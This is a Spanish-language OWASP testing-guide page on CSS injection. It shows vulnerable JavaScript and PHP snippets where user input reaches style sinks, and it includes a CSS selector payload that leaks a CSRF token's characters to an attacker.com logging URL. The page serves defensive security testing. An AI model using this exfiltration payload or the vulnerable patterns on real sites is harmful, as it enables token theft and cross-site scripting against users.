# Pruebas de Inyección CSS

|ID          |
|------------|
|WSTG-CLNT-05|

## Resumen

Una vulnerabilidad de Inyección CSS involucra la capacidad de inyectar código CSS arbitrario en el contexto de un sitio confiable que es renderizado dentro del navegador de una víctima. El impacto de este tipo de vulnerabilidad varía según el payload CSS proporcionado. Puede llevar a cross-site scripting o exfiltración de datos.

Esta vulnerabilidad ocurre cuando la aplicación permite que CSS proporcionado por el usuario interfiera con las hojas de estilo legítimas de la aplicación. Inyectar código en el contexto CSS puede proporcionar a un atacante la capacidad de ejecutar JavaScript bajo ciertas condiciones, o de extraer valores sensibles usando selectores CSS y funciones capaces de generar solicitudes HTTP. Generalmente, permitir a los usuarios la capacidad de personalizar páginas proporcionando archivos CSS personalizados es un riesgo considerable.

El siguiente código JavaScript muestra un posible script vulnerable en el cual el atacante es capaz de controlar el `location.hash` (fuente) que llega a la función `cssText` (sink). Este caso particular puede llevar a XSS basado en DOM en versiones antiguas de navegadores; para más información, ver la [Hoja de Referencia de Prevención de XSS Basado en DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

> Nota: Algunas técnicas de ejecución de JavaScript basadas en CSS dependen del comportamiento heredado del navegador (por ejemplo, versiones antiguas de IE y Opera). Mientras que los navegadores modernos mitigan la mayoría de estos vectores, la inyección CSS todavía puede habilitar la exfiltración de datos, la manipulación de UI y el encadenamiento de ataques.

La misma vulnerabilidad puede aparecer en el caso de XSS reflejado, por ejemplo, en el siguiente código PHP:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Otros escenarios de ataque involucran la capacidad de extraer datos a través de la adopción de reglas CSS puras. Tales ataques pueden ser conducidos a través de selectores CSS, llevando a la exfiltración de datos, por ejemplo, tokens CSRF.

Aquí hay un ejemplo de código que intenta seleccionar una entrada con un `name` que coincida con `csrf_token` y un `value` que comience con una `a`. Al utilizar un ataque de fuerza bruta para determinar el `value` del atributo, es posible llevar a cabo un ataque que envíe el valor al dominio del atacante, tal como intentando establecer una imagen de fondo en el elemento de entrada seleccionado.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>
```

Otros ataques usando contenido solicitado tal como CSS se destacan en la charla de Mario Heiderich, "Got Your Nose", en [YouTube](https://www.youtube.com/watch?v=FIQvAaZj_HA).

## Objetivos de Prueba

- Identificar puntos de inyección CSS.
- Evaluar el impacto de la inyección.

## Cómo Probar

El código debería ser analizado para determinar si se permite a un usuario inyectar contenido en el contexto CSS. Particularmente, debería inspeccionarse la manera en que el sitio devuelve reglas CSS sobre la base de las entradas.

El siguiente es un ejemplo básico:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

El código anterior contiene una fuente `location.hash`, controlada por el atacante, que puede inyectar directamente en el atributo `style` de un elemento HTML. Como se mencionó anteriormente, esto puede llevar a diferentes resultados dependiendo del navegador en uso y el payload proporcionado.

Las siguientes páginas proporcionan ejemplos de vulnerabilidades de inyección CSS:

- ["Cracker" de contraseñas vía CSS y HTML5](https://html5sec.org/invalid/?length=25)
- [Ataques basados en JavaScript usando `CSSStyleDeclaration` con entrada sin escapar](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Para más recursos de OWASP sobre prevención de inyección CSS, ver la [Hoja de Referencia de Aseguramiento de Hojas de Estilo en Cascada](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
